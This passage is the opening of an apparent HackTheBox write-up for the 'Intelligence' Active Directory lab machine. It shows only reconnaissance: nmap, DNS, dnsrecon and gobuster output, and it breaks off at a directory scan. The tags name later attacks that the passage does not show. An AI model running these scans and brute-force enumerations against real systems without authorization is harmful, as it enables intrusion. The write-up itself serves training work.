---
render_with_liquid: false
title: HackTheBox Writeup  Intelligence
date: 2023-12-25 22:19:50 +1400
tags: [hackthebox, nmap, windows, ad, netexec, feroxbuster, pdf, exiftool, dfuf, user-enumeration, kerbrute, discover-secrets, password-spraying, smartbrute, default-credentials, ldapdomaindump, bloodhound, ad-miner, smb, powershell-script, adidns-poisoning, dnstool, responder, coerce-authentication, hashcat, ad-gmsa, gmsadumper, ad-delegation, ad-s4u2self, impacket, silver-ticket, dcsync, evil-winrm, oscp-like-2023, nopac]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Dec 25 22:19:50 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49711,49715,53021 10.129.208.58
Nmap scan report for 10.129.208.58
Host is up, received user-set (0.76s latency).
Scanned at 2023-12-25 22:19:50 CST for 119s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-12-25 21:19:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
| aWdlbmNlMRswGQYDVQQDExJpbnRlbGxpZ2VuY2UtREMtQ0EwHhcNMjEwNDE5MDA0
| MzE2WhcNMjIwNDE5MDA0MzE2WjAeMRwwGgYDVQQDExNkYy5pbnRlbGxpZ2VuY2Uu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCX8Wz5Z7/hs1L9f
| F3QgoOIpTaMp7gi+vxcj8ICORH+ujWj+tNbuU0JZNsviRPyB9bRxkx7dIT8kF8+8
| u+ED4K38l8ucL9cv14jh1xrf9cfPd/CQAd6+AO6qX9olVNnLwExSdkz/ysJ0F5FU
| xk+l60z1ncIfkGVxRsXSqaPyimMaq1E8GvHT70hNc6RwhyDUIYXS6TgKEJ5wwyPs
| s0VFlsvZ19fOUyKyq9XdyziyKB4wYIiVyptRDvst1rJS6mt6LaANomy5x3ZXxTf7
| RQOJaiUA9fjiV4TTVauiAf9Vt0DSgCPFoRL2oPbvrN4WUluv/PrVpNBeuN3Akks6
| cmxzKQIDAQABo4IC/jCCAvowLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUCA00YNMscsMLHdNQNIASzc940RUwHwYDVR0jBBgwFoAUo2aX3GwKIqdG
| sKQv+8oXL8nKl8swgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| aW50ZWxsaWdlbmNlLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWludGVs
| bGlnZW5jZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCB
| uTCBtgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWludGVsbGlnZW5jZS1EQy1DQSxD
| Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
| Q29uZmlndXJhdGlvbixEQz1pbnRlbGxpZ2VuY2UsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1Ud
| EQQ4MDagHwYJKwYBBAGCNxkBoBIEEIHijfJ5/cVAp3sSUrgFUO2CE2RjLmludGVs
| bGlnZW5jZS5odGIwDQYJKoZIhvcNAQELBQADggEBAAe43GWMvptRljuuQyFyo+AG
| c/CL8gNCVGvmkRfXyqK+vb2DBWTQ6uUjl+8hA3WuROBFUkwea5gOByKZdTPQrdou
| mVEeAf96bVQ+7/03O3Sz+0jCVTUbAJGnXNnMLStfx6TiMBqfDqsCcWRf2yScX9J4
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-25T21:21:26+00:00; +6h59m43s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-25T21:21:25+00:00; +6h59m44s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
| aWdlbmNlMRswGQYDVQQDExJpbnRlbGxpZ2VuY2UtREMtQ0EwHhcNMjEwNDE5MDA0
| MzE2WhcNMjIwNDE5MDA0MzE2WjAeMRwwGgYDVQQDExNkYy5pbnRlbGxpZ2VuY2Uu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCX8Wz5Z7/hs1L9f
| F3QgoOIpTaMp7gi+vxcj8ICORH+ujWj+tNbuU0JZNsviRPyB9bRxkx7dIT8kF8+8
| u+ED4K38l8ucL9cv14jh1xrf9cfPd/CQAd6+AO6qX9olVNnLwExSdkz/ysJ0F5FU
| xk+l60z1ncIfkGVxRsXSqaPyimMaq1E8GvHT70hNc6RwhyDUIYXS6TgKEJ5wwyPs
| s0VFlsvZ19fOUyKyq9XdyziyKB4wYIiVyptRDvst1rJS6mt6LaANomy5x3ZXxTf7
| RQOJaiUA9fjiV4TTVauiAf9Vt0DSgCPFoRL2oPbvrN4WUluv/PrVpNBeuN3Akks6
| cmxzKQIDAQABo4IC/jCCAvowLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUCA00YNMscsMLHdNQNIASzc940RUwHwYDVR0jBBgwFoAUo2aX3GwKIqdG
| sKQv+8oXL8nKl8swgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| aW50ZWxsaWdlbmNlLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWludGVs
| bGlnZW5jZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCB
| uTCBtgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWludGVsbGlnZW5jZS1EQy1DQSxD
| Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
| Q29uZmlndXJhdGlvbixEQz1pbnRlbGxpZ2VuY2UsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1Ud
| EQQ4MDagHwYJKwYBBAGCNxkBoBIEEIHijfJ5/cVAp3sSUrgFUO2CE2RjLmludGVs
| bGlnZW5jZS5odGIwDQYJKoZIhvcNAQELBQADggEBAAe43GWMvptRljuuQyFyo+AG
| c/CL8gNCVGvmkRfXyqK+vb2DBWTQ6uUjl+8hA3WuROBFUkwea5gOByKZdTPQrdou
| mVEeAf96bVQ+7/03O3Sz+0jCVTUbAJGnXNnMLStfx6TiMBqfDqsCcWRf2yScX9J4
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
| aWdlbmNlMRswGQYDVQQDExJpbnRlbGxpZ2VuY2UtREMtQ0EwHhcNMjEwNDE5MDA0
| MzE2WhcNMjIwNDE5MDA0MzE2WjAeMRwwGgYDVQQDExNkYy5pbnRlbGxpZ2VuY2Uu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCX8Wz5Z7/hs1L9f
| F3QgoOIpTaMp7gi+vxcj8ICORH+ujWj+tNbuU0JZNsviRPyB9bRxkx7dIT8kF8+8
| u+ED4K38l8ucL9cv14jh1xrf9cfPd/CQAd6+AO6qX9olVNnLwExSdkz/ysJ0F5FU
| xk+l60z1ncIfkGVxRsXSqaPyimMaq1E8GvHT70hNc6RwhyDUIYXS6TgKEJ5wwyPs
| s0VFlsvZ19fOUyKyq9XdyziyKB4wYIiVyptRDvst1rJS6mt6LaANomy5x3ZXxTf7
| RQOJaiUA9fjiV4TTVauiAf9Vt0DSgCPFoRL2oPbvrN4WUluv/PrVpNBeuN3Akks6
| cmxzKQIDAQABo4IC/jCCAvowLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUCA00YNMscsMLHdNQNIASzc940RUwHwYDVR0jBBgwFoAUo2aX3GwKIqdG
| sKQv+8oXL8nKl8swgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| aW50ZWxsaWdlbmNlLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWludGVs
| bGlnZW5jZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCB
| uTCBtgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWludGVsbGlnZW5jZS1EQy1DQSxD
| Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
| Q29uZmlndXJhdGlvbixEQz1pbnRlbGxpZ2VuY2UsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1Ud
| EQQ4MDagHwYJKwYBBAGCNxkBoBIEEIHijfJ5/cVAp3sSUrgFUO2CE2RjLmludGVs
| bGlnZW5jZS5odGIwDQYJKoZIhvcNAQELBQADggEBAAe43GWMvptRljuuQyFyo+AG
| c/CL8gNCVGvmkRfXyqK+vb2DBWTQ6uUjl+8hA3WuROBFUkwea5gOByKZdTPQrdou
| mVEeAf96bVQ+7/03O3Sz+0jCVTUbAJGnXNnMLStfx6TiMBqfDqsCcWRf2yScX9J4
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-25T21:21:27+00:00; +6h59m44s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
| aWdlbmNlMRswGQYDVQQDExJpbnRlbGxpZ2VuY2UtREMtQ0EwHhcNMjEwNDE5MDA0
| MzE2WhcNMjIwNDE5MDA0MzE2WjAeMRwwGgYDVQQDExNkYy5pbnRlbGxpZ2VuY2Uu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCX8Wz5Z7/hs1L9f
| F3QgoOIpTaMp7gi+vxcj8ICORH+ujWj+tNbuU0JZNsviRPyB9bRxkx7dIT8kF8+8
| u+ED4K38l8ucL9cv14jh1xrf9cfPd/CQAd6+AO6qX9olVNnLwExSdkz/ysJ0F5FU
| xk+l60z1ncIfkGVxRsXSqaPyimMaq1E8GvHT70hNc6RwhyDUIYXS6TgKEJ5wwyPs
| s0VFlsvZ19fOUyKyq9XdyziyKB4wYIiVyptRDvst1rJS6mt6LaANomy5x3ZXxTf7
| RQOJaiUA9fjiV4TTVauiAf9Vt0DSgCPFoRL2oPbvrN4WUluv/PrVpNBeuN3Akks6
| cmxzKQIDAQABo4IC/jCCAvowLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUCA00YNMscsMLHdNQNIASzc940RUwHwYDVR0jBBgwFoAUo2aX3GwKIqdG
| sKQv+8oXL8nKl8swgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| aW50ZWxsaWdlbmNlLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWludGVs
| bGlnZW5jZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCB
| uTCBtgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWludGVsbGlnZW5jZS1EQy1DQSxD
| Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
| Q29uZmlndXJhdGlvbixEQz1pbnRlbGxpZ2VuY2UsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1Ud
| EQQ4MDagHwYJKwYBBAGCNxkBoBIEEIHijfJ5/cVAp3sSUrgFUO2CE2RjLmludGVs
| bGlnZW5jZS5odGIwDQYJKoZIhvcNAQELBQADggEBAAe43GWMvptRljuuQyFyo+AG
| c/CL8gNCVGvmkRfXyqK+vb2DBWTQ6uUjl+8hA3WuROBFUkwea5gOByKZdTPQrdou
| mVEeAf96bVQ+7/03O3Sz+0jCVTUbAJGnXNnMLStfx6TiMBqfDqsCcWRf2yScX9J4
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-25T21:21:25+00:00; +6h59m44s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53021/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-12-25T21:20:48
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 61256/tcp): CLEAN (Timeout)
|   Check 2 (port 13316/tcp): CLEAN (Timeout)
|   Check 3 (port 18656/udp): CLEAN (Timeout)
|   Check 4 (port 55927/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m43s, deviation: 0s, median: 6h59m43s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Dec 25 22:21:49 2023 -- 1 IP address (1 host up) scanned in 119.46 seconds
```

## 53 - DNS


### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ dig -x 10.129.208.58 @10.129.208.58
;; communications error to 10.129.208.58#53: timed out

; <<>> DiG 9.19.17-2~kali1-Kali <<>> -p 53 -x 10.129.208.58 @10.129.208.58
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 52178
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;58.208.129.10.in-addr.arpa.    IN      PTR

;; Query time: 4907 msec
;; SERVER: 10.129.208.58#53(10.129.208.58) (UDP)
;; WHEN: Tue Dec 26 14:39:48 CST 2023
;; MSG SIZE  rcvd: 55
```


### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ dig axfr @10.129.208.58 intelligence.htb

; <<>> DiG 9.19.17-2~kali1-Kali <<>> axfr @10.129.208.58 intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ dnsrecon -n intelligence.htb -d intelligence.htb
[*] std: Performing General Enumeration against: intelligence.htb...
[-] DNSSEC is not configured for intelligence.htb
[*]      SOA dc.intelligence.htb 10.129.208.58
[*]      SOA dc.intelligence.htb dead:beef::1dd
[*]      SOA dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052
[*]      NS dc.intelligence.htb 10.129.208.58
[*]      NS dc.intelligence.htb dead:beef::1dd
[*]      NS dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052
[*]      A intelligence.htb 10.129.208.58
[*]      AAAA intelligence.htb dead:beef::4d15:1795:f3c4:9052
[*]      AAAA intelligence.htb dead:beef::1dd
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.intelligence.htb dc.intelligence.htb 10.129.208.58 3268
[+]      SRV _gc._tcp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 3268
[+]      SRV _gc._tcp.intelligence.htb dc.intelligence.htb dead:beef::1dd 3268
[+]      SRV _kerberos._tcp.intelligence.htb dc.intelligence.htb 10.129.208.58 88
[+]      SRV _kerberos._tcp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 88
[+]      SRV _kerberos._tcp.intelligence.htb dc.intelligence.htb dead:beef::1dd 88
[+]      SRV _kerberos._udp.intelligence.htb dc.intelligence.htb 10.129.208.58 88
[+]      SRV _kerberos._udp.intelligence.htb dc.intelligence.htb dead:beef::1dd 88
[+]      SRV _kerberos._udp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 88
[+]      SRV _ldap._tcp.intelligence.htb dc.intelligence.htb 10.129.208.58 389
[+]      SRV _ldap._tcp.intelligence.htb dc.intelligence.htb dead:beef::1dd 389
[+]      SRV _ldap._tcp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 389
[+]      SRV _ldap._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb 10.129.208.58 389
[+]      SRV _ldap._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::1dd 389
[+]      SRV _ldap._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 389
[+]      SRV _ldap._tcp.pdc._msdcs.intelligence.htb dc.intelligence.htb 10.129.208.58 389
[+]      SRV _ldap._tcp.pdc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 389
[+]      SRV _ldap._tcp.pdc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::1dd 389
[+]      SRV _ldap._tcp.ForestDNSZones.intelligence.htb dc.intelligence.htb 10.129.208.58 389
[+]      SRV _ldap._tcp.ForestDNSZones.intelligence.htb dc.intelligence.htb dead:beef::1dd 389
[+]      SRV _ldap._tcp.ForestDNSZones.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 389
[+]      SRV _ldap._tcp.gc._msdcs.intelligence.htb dc.intelligence.htb 10.129.208.58 3268
[+]      SRV _ldap._tcp.gc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 3268
[+]      SRV _ldap._tcp.gc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::1dd 3268
[+]      SRV _kpasswd._tcp.intelligence.htb dc.intelligence.htb 10.129.208.58 464
[+]      SRV _kpasswd._tcp.intelligence.htb dc.intelligence.htb dead:beef::1dd 464
[+]      SRV _kpasswd._tcp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 464
[+]      SRV _kerberos._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb 10.129.208.58 88
[+]      SRV _kerberos._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::1dd 88
[+]      SRV _kerberos._tcp.dc._msdcs.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 88
[+]      SRV _kpasswd._udp.intelligence.htb dc.intelligence.htb 10.129.208.58 464
[+]      SRV _kpasswd._udp.intelligence.htb dc.intelligence.htb dead:beef::4d15:1795:f3c4:9052 464
[+]      SRV _kpasswd._udp.intelligence.htb dc.intelligence.htb dead:beef::1dd 464
[+] 33 Records Found
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ gobuster dns -d intelligence.htb -r intelligence.htb -o gobuster_dns.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     intelligence.htb
[+] Threads:    100
[+] Resolver:   intelligence.htb
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.intelligence.htb

Found: gc._msdcs.intelligence.htb

Found: domaindnszones.intelligence.htb

Found: forestdnszones.intelligence.htb

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 80 - Site : Intelligence


### Info

```ruby
http://intelligence.htb [200] [Intelligence] [Microsoft-IIS/10.0] [IIS:10.0,Windows Server] [61e75312161023d31c47b4d2df451a5d304386c8]
```

![](/assets/obsidian/26e4d32db475309a231423ed547a3871.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://intelligence.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
